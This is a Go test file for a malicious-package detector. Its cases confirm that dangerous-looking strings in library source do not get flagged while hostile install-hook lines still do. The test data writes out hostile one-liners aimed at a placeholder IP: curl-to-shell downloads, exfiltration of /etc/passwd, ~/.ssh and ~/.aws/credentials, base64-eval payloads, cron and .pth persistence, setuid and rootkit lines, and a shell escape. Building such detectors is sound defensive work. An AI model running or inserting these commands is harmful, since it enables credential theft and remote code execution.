package detect

import "testing"

// Pass 11 (2026-10-18). A rescan of mints withdrawn as stale still judged 22 of them malicious
// under the current engine, and every one was a false positive of a rule that treats a STRING in
// library source as if it were an action:
//
//	P-PASSWD-READ  10  path-traversal tests and docstrings: os.path.join(dest, "/etc/passwd")
//	P-CURL-PIPE     5  install hints: {"Linux": "curl -f https://zed.dev/install.sh | sh"}
//	P-EVAL-BASE64   1  prose: "the eval-binding ROOT COMMITMENT (root_b64, a non-empty base64 string)"
//
// Each of these is evidence only where it runs unattended -- an install hook. A library's
// runtime source merely mentions it. Ground truth (OpenSSF malicious-packages, pypi, name join):
// 5 of 1,200 packages carrying P-PASSWD-READ, 1 of 1,147 for P-CURL-PIPE and 1 of 114 for
// P-EVAL-BASE64 are confirmed malicious, and none of those lacks other evidence.

func libraryMints(eco, src string) bool {
	return CombinedVerdict(Detect(&PackageContext{Name: "pkg", Ecosystem: eco, PkgbuildContent: src})).Malicious
}

func hookMints(eco, src string) bool {
	return CombinedVerdict(Detect(&PackageContext{Name: "pkg", Ecosystem: eco, InstallScriptContent: src})).Malicious
}

func TestLibrarySourceMentioningADangerousStringDoesNotMint(t *testing.T) {
	for _, tc := range []struct{ eco, line string }{
		{"pypi", `        ("/etc/shadow",     "data_leakage",  0.30),`},
		{"pypi", `process can write (note os.path.join(dest, "/etc/passwd") is just`},
		{"pypi", `>>> check_url("file:///etc/passwd")`},
		{"pypi", `arbitrary ref, so a value like ../../x or /etc/passwd could`},
		{"cargo", `let p = Path::new("/etc/passwd"); assert!(!is_contained(p, root));`},
		{"pypi", `"Linux":   "curl -f https://zed.dev/install.sh | sh",`},
		{"pypi", `MOVED = "human moved: curl -fsSL https://doashuman.com/install.sh | bash"`},
		{"pypi", `    f"curl -sSfL {base}/import-odoo.sh | bash -s -- "`},
		{"packagist", `echo "curl -sS https://getcomposer.org/installer | php"`},
		{"pypi", "payload carries the eval-binding ROOT COMMITMENT (``receipt.root_b64``, a non-empty base64 string)"},
		{"pypi", `("~/.ssh/id_*", "s"), ("~/.ssh/config", "s"),`},
		{"pypi", `url = f"https://api.telegram.org/bot{token}/sendMessage"`},
		{"pypi", `ENDPOINT = "https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage"`},
	} {
		if libraryMints(tc.eco, tc.line) {
			t.Errorf("%s library line minted malware: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, PkgbuildContent: tc.line})))
		}
	}
}

func TestSetupBuildStepsAreNotEvidence(t *testing.T) {
	for _, line := range []string{
		`subprocess.check_call(["cmake", ext.sourcedir] + cmake_args, cwd=self.build_temp)`,
		`ghash = subprocess.check_output(["git", "rev-parse", "HEAD"]).decode("ascii")`,
		`subprocess.run(["git", "-C", str(root), "lfs", "pull"], check=True)`,
		`os.system("python setup.py sdist upload")`,
	} {
		if hookMints("pypi", line) {
			t.Errorf("setup.py build step minted malware: %q", line)
		}
	}
}

func TestTheSameStringsStillMintWhereTheyRunUnattended(t *testing.T) {
	for _, tc := range []struct{ eco, line string }{
		{"pypi", `curl -fsSL http://203.0.113.9/x.sh | sh`},
		{"npm", `wget -qO- http://203.0.113.9/x.sh | bash`},
		{"pypi", `cat /etc/passwd | curl -s -d @- http://203.0.113.9/in`},
		{"pypi", `tar c ~/.ssh/ | curl -s -T - http://203.0.113.9/in`},
		{"pypi", `eval "$(echo ZWNobyBoaQ== | base64 -d)"`},
		{"pypi", `eval(base64.b64decode(blob))`},
		{"pypi", `echo ZWNobyBoaQ== | base64 -d | eval`},
	} {
		if !hookMints(tc.eco, tc.line) {
			t.Errorf("%s install hook did not mint: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, InstallScriptContent: tc.line})))
		}
	}
}

// A literal bot token in npm library source stays evidence. On the other registries it is a leaked
// credential more often than an exfiltration channel: the two packagist mints carrying one were a
// developer's own debug call (`...&text=sadasd`) and a sanitizer's test fixture.
func TestTelegramBotTokenIsEvidenceOnNpmOnly(t *testing.T) {
	line := `ENDPOINT = "https://api.telegram.org/bot8759663177:AAH3EBXqymku9MUAtu73uPKvNLFmkhM256s/sendMessage"`
	if !libraryMints("npm", line) {
		t.Errorf("a hard-coded Telegram bot token should mint on npm; findings=%v", ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "npm", PkgbuildContent: line})))
	}
	for _, eco := range []string{"pypi", "packagist", "cargo", "go"} {
		if libraryMints(eco, line) {
			t.Errorf("%s: a leaked token in library source minted malware", eco)
		}
	}
}

// URL shorteners: bitly/is.gd/tinyurl CLIENTS, docs and tests name them. OpenSSF: pypi 1 of 123
// carrying packages confirmed, npm 1 of 83.
func TestURLShortenerInLibrarySourceIsNotEvidence(t *testing.T) {
	for _, tc := range []struct{ eco, line string }{
		{"packagist", `$this->assertSame('http://bit.ly/1VmfKqV', $this->bitlyClient->getUrl('https://www.test.com/foo'));`},
		{"packagist", `return 'http://is.gd/api.php?longurl=' . rawurlencode($url);`},
		{"pypi", `API_URL = "http://tinyurl.com/api-create.php"`},
		{"npm", `// see http://bit.ly/1dIn55j for the guide`},
		{"go", `const shortener = "https://is.gd/create.php"`},
	} {
		if libraryMints(tc.eco, tc.line) {
			t.Errorf("%s: shortener in library source minted malware: %q", tc.eco, tc.line)
		}
	}
	if !hookMints("pypi", `curl -sL https://bit.ly/3xAbC | sh`) {
		t.Error("a shortener piped to a shell in an install hook must still mint")
	}
}

// The three Python behaviour rules are setup.py rules. Each case below is a real package the
// whole-package scan minted on two unrelated statements: `importlib` in one place and `exec(`
// in another (cxp, cat-agent), and ~/.aws/credentials read for AWS auth in one module with a
// request in another (puppetmaster-ai).
func TestSetupBehavioursDoNotJoinUnrelatedLibraryStatements(t *testing.T) {
	for _, tc := range []struct{ name, src string }{
		{"cxp", "from importlib.metadata import PackageNotFoundError, distribution\nSCRIPT = (\n    f\"names={names}; items={{}}; \"\n    'exec(code)'\n)\n"},
		{"cat-agent", "    r'importlib\\.import_module\\s*\\(',  # dynamic imports via importlib\n]\nmsg = ('Disallowed: importlib.import_module()'\n      )\nexec(code, ns)\n"},
		{"puppetmaster-ai", "\"\"\"Read access key from ``~/.aws/credentials``.\"\"\"\ncreds = open(os.path.expanduser('~/.aws/credentials')).read()\nr = requests.get('https://bedrock.example/v1')\n"},
	} {
		f := Detect(&PackageContext{Name: tc.name, Ecosystem: "pypi", PkgbuildContent: tc.src})
		for _, id := range []string{"PY-SETUP-IMPORTLIB-EXEC", "PY-SETUP-CRED-EXFIL", "PY-PTH-AUTOIMPORT-PERSISTENCE"} {
			if has(f, id) {
				t.Errorf("%s: library source fired %s; findings=%v", tc.name, id, ids(f))
			}
		}
		if CombinedVerdict(f).Malicious {
			t.Errorf("%s: library source minted malware; findings=%v", tc.name, ids(f))
		}
	}
}

func TestSetupBehavioursStillFireInSetupPy(t *testing.T) {
	for _, tc := range []struct{ id, src string }{
		{"PY-SETUP-IMPORTLIB-EXEC", "import importlib; exec(importlib.import_module('p').PAYLOAD)\n"},
		{"PY-SETUP-CRED-EXFIL", "d = open(os.path.expanduser('~/.aws/credentials')).read()\nrequests.post('https://x.example/c', data=d)\n"},
		{"PY-PTH-AUTOIMPORT-PERSISTENCE", `open(os.path.join(sitedir, "evil.pth"), "w").write("import evil; evil.run()")` + "\n"},
	} {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: tc.src})
		if !has(f, tc.id) && !has(f, "IS-"+tc.id) {
			t.Errorf("%s: setup.py content did not fire; findings=%v", tc.id, ids(f))
		}
		if !CombinedVerdict(f).Malicious {
			t.Errorf("%s: setup.py content did not mint; findings=%v", tc.id, ids(f))
		}
	}
}

func TestSetupHostReconIsEvidence(t *testing.T) {
	line := `_host = subprocess.check_output(["hostname"]).decode(errors="replace").strip()`
	if !hookMints("pypi", line) {
		t.Errorf("setup.py fingerprinting the host should mint; findings=%v", ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", InstallScriptContent: line})))
	}
	if hookMints("pypi", `subprocess.check_output(["git", "describe", "--tags"])`) {
		t.Error("git describe in setup.py must not mint")
	}
}

// The demotion is per registry, because the measurement is. On npm and rubygems the same strings
// are where the malware sits: of the npm packages carrying them, P-TELEGRAM-BOT 12 of 54,
// P-PASSWD-READ 12 of 120 and G-PIPE-NODE 19 of 26 are OpenSSF-confirmed (pypi: 4%, 0.4%, none).
func TestNpmAndRubygemsKeepTheseAsEvidenceInLibrarySource(t *testing.T) {
	for _, tc := range []struct{ eco, line string }{
		{"npm", `const pw = require('fs').readFileSync('/etc/passwd', 'utf8');`},
		{"npm", `fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=1&text=" + env)`},
		{"npm", `require('child_process').exec('curl -s http://203.0.113.9/x | node')`},
		{"npm", `exec("tar c ~/.ssh/ | curl -s -T - http://203.0.113.9/in")`},
		{"rubygems", `system("curl -s http://203.0.113.9/x.sh | sh")`},
		{"rubygems", `File.read("/etc/passwd")`},
	} {
		if !libraryMints(tc.eco, tc.line) {
			t.Errorf("%s library line should still mint: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, PkgbuildContent: tc.line})))
		}
	}
}

// Residuals of the live re-judge of single-rule pypi mints (2026-10-18), one real line each.
func TestLongTailLibraryStringsDoNotMint(t *testing.T) {
	for _, tc := range []struct{ eco, line string }{
		{"pypi", `jwt_body_dict = eval(str(base64.urlsafe_b64decode(jwt_body), "utf-8"))`},
		{"pypi", `suspicious_words = [b"eval(", b"os.system(", b"powershell", b"base64_decode"]`},
		{"pypi", `"if curl -fsS http://127.0.0.1:8092/health >/dev/null 2>&1; then echo health-ok; exit 0; fi; "`},
		{"pypi", `[ -d /mnt/sysroot/dev ] && mount -o bind /dev /mnt/sysroot/dev`},
		{"pypi", `f"send_key_to_tmux: tmux send-keys {key} failed "`},
		{"pypi", `save_ifs=$IFS`},
		{"pypi", `'~/.mozilla/firefox',`},
		{"pypi", `start_commands=[str(bore_bin), 'local', str(port), '--to', 'bore.pub'],`},
		{"pypi", "see https://example.dev/docs com（否则 use the default）"},
	} {
		if libraryMints(tc.eco, tc.line) {
			t.Errorf("%s library line minted malware: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, PkgbuildContent: tc.line})))
		}
	}
}

func TestHomographNeedsConfusableScripts(t *testing.T) {
	if libraryMints("pypi", "url = https://com（否则") {
		t.Error("Latin beside Han is not a homograph spoof")
	}
}

// Four go mirrors of the curl project (github.com/curl/curl, bagder/curl, curl/everything-curl,
// perl6-net-curl) were minted on P-INSTALL-CURL: `\s` after `curl` matched the newline ending
// the go.mod `module` line.
func TestInstallCurlIsACommandNotAModuleName(t *testing.T) {
	for _, src := range []string{"module github.com/curl/curl\n\ngo 1.21\n", "module github.com/azawawi/perl6-net-curl\n"} {
		if hookMints("go", src) {
			t.Errorf("a module named curl minted malware: %q", src)
		}
	}
	if !hookMints("go", "curl -fsSL http://203.0.113.9/x.sh | sh\n") {
		t.Error("curl with arguments in an install hook must still mint")
	}
}

// Pass 13: four more strings that library source merely mentions. Real lines from live mints
// (cron-expression parsers, clipboard-tool names in an error, `curl -X POST` in a script or doc,
// a systemd user-unit path). Hook surfaces and npm are not demoted.
func TestCronClipboardPostSystemdAreStringsInLibrarySource(t *testing.T) {
	for _, tc := range []struct{ eco, line string }{
		{"pypi", `"""Parse crontab expression -> (minute, hour, dom, month, dow) sets."""`},
		{"go", `crontab := m.triggerCrontab()`},
		{"packagist", `'crontab' => [`},
		{"pypi", `raise ClipboardError("wl-paste is not installed.")`},
		{"go", `return nil, "", fmt.Errorf("clipboard image paste needs wl-clipboard (Wayland) or xclip (X11) installed")`},
		{"pypi", `curl -sS -X POST "$MCP_UNIFIED_GATEWAY_URL/policy/explain" -d "$BODY"`},
		{"cargo", `curl -s -X POST localhost:8600/api/ticket/1/action/open -H "Authorization: Bearer $TOKEN"`},
		{"pypi", `path = Path.home() / ".config/systemd/user/autohilt-link.service"`},
	} {
		if libraryMints(tc.eco, tc.line) {
			t.Errorf("%s library line minted malware: %q; findings=%v", tc.eco, tc.line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: tc.eco, PkgbuildContent: tc.line})))
		}
	}
}

func TestCronPersistenceStillMintsInAnInstallHook(t *testing.T) {
	if !hookMints("pypi", `echo "*/5 * * * * root curl http://203.0.113.9/b" > /etc/cron.d/system-update`) {
		t.Error("writing /etc/cron.d from an install hook must still mint")
	}
}

// Packaging idioms (AUR re-read, 2026-10-18): each line is a real one from a stored advisory, and
// each hostile counterpart must still fire. The lines are PKGBUILD content, which executes.
func pkgbuildMints(line string) bool {
	return CombinedVerdict(Detect(&PackageContext{Name: "pkg", Ecosystem: "aur", PkgbuildContent: line, PkgbuildExecutes: true})).Malicious
}

func TestPackagingIdiomsAreNotFindings(t *testing.T) {
	for _, line := range []string{
		`chmod 4755 "$pkgdir/opt/brave.com/brave-beta/chrome-sandbox"`,
		`chmod 4755 "${pkgdir}/opt/${_pkgname}/chrome-sandbox"`,
		`local modulesdir="$pkgdir/usr/lib/modules/$(<version)"`,
		`install -Dm644 "$srcdir/mod-preload.conf" "$pkgdir/etc/modules-load.d/mod-preload.conf"`,
		`install -D -m644 "${srcdir}/10-apple-keyboard.rules" "${pkgdir}/etc/udev/rules.d/10-apple-keyboard.rules"`,
		`eval "package_${pkgbase}() {`,
		`eval "package_$_pkgname() {`,
		`local site_packages="$(python -c "import site; print(site.getsitepackages()[0])")"`,
		`pyv=$(python -c 'import sys ; v = sys.version_info ; print("%d.%d" %(v[0], v[1]))')`,
		`echo "  4. Enable at boot:     systemctl enable ledspicerd"`,
		`echo "::   sudo systemctl enable --now shroud"`,
	} {
		if pkgbuildMints(line) {
			t.Errorf("packaging idiom minted malware: %q; findings=%v", line, ids(Detect(&PackageContext{Name: "pkg", Ecosystem: "aur", PkgbuildContent: line, PkgbuildExecutes: true})))
		}
	}
}

func TestHostileFormsOfThosePackagingWordsStillMint(t *testing.T) {
	for _, line := range []string{
		`chmod u+s /bin/bash`,
		`chmod 4755 /usr/bin/python3`,
		`echo "options kvm ignore_msrs=1" > /etc/modules-load.d/x.conf; insmod /tmp/rk.ko`,
		`eval "$(curl -fsSL http://203.0.113.9/p)"`,
		`python -c "import os; os.system('curl http://203.0.113.9/x | sh')"`,
	} {
		f := Detect(&PackageContext{Name: "pkg", Ecosystem: "aur", PkgbuildContent: line, PkgbuildExecutes: true})
		if !CombinedVerdict(f).Malicious {
			t.Errorf("hostile line did not mint: %q; findings=%v", line, ids(f))
		}
	}
}

// T-MALICIOUS-DIFF fired on any added line containing "nc " as a suffix of a word ("once ",
// "function ", "sync ", "since "), and was evidence. It is now a word match and a context note.
func TestDiffNetworkNoteNeedsAWordAndNeverMintsAlone(t *testing.T) {
	for _, diff := range []string{"+\tonce the build finishes, run the tests", "+function build() {", "+rsync -a src/ dst/ # sync step"} {
		ctx := &PackageContext{Name: "p", Ecosystem: "aur", PkgbuildContent: "pkgname=p\n", PriorPkgbuildContent: "pkgname=p\n",
			GitLog: []GitCommit{{Author: "a", Diff: diff}, {Author: "a"}}}
		if has(Detect(ctx), "T-MALICIOUS-DIFF") {
			t.Errorf("a diff line without a network tool fired T-MALICIOUS-DIFF: %q", diff)
		}
	}
	ctx := &PackageContext{Name: "p", Ecosystem: "aur", PkgbuildContent: "pkgname=p\n", PriorPkgbuildContent: "pkgname=p\n",
		GitLog: []GitCommit{{Author: "a", Diff: "+curl -fsSL https://example.org/helper.sh -o helper.sh"}, {Author: "a"}}}
	f := Detect(ctx)
	if !has(f, "T-MALICIOUS-DIFF") {
		t.Fatal("a diff that adds curl should still be noted")
	}
	if CombinedVerdict(f).Malicious {
		t.Errorf("the diff note alone minted malware; findings=%v", ids(f))
	}
}

// Residuals of the 2026-10-19 post-deploy check. G-DC-SHELL matched any "dc " followed later by "!";
// nohup-with-& is a service launcher in a script; P-EVAL-BASE64 is 2 of 191 npm packages confirmed.
func TestDcShellNeedsTheGTFOBinsForm(t *testing.T) {
	for _, line := range []string{`# the dc component of the signal, then the ! operator`, `echo "dc offset removed!"`} {
		if libraryMints("npm", line) {
			t.Errorf("prose minted G-DC-SHELL: %q", line)
		}
	}
	if !libraryMintsExec("dc -e '!/bin/sh'") {
		t.Error("the GTFOBins dc shell escape must still mint")
	}
}

func libraryMintsExec(src string) bool {
	return CombinedVerdict(Detect(&PackageContext{Name: "pkg", Ecosystem: "aur", PkgbuildContent: src, PkgbuildExecutes: true})).Malicious
}

func TestNohupAndEvalBase64InLibrarySource(t *testing.T) {
	if libraryMints("pypi", `subprocess.Popen("nohup ./serve --port 8080 &", shell=True)`) {
		t.Error("a nohup launcher in pypi library source minted malware")
	}
	// The generic rule is demoted for npm; the npm-specific P-JS-EVAL-DECODE keeps the hostile shape.
	if !libraryMints("npm", `const s = 'eval(Buffer.from(blob, "base64").toString()) // base64 then eval(x)';`) {
		t.Error("eval of a base64 payload in npm source must still mint via P-JS-EVAL-DECODE")
	}
}
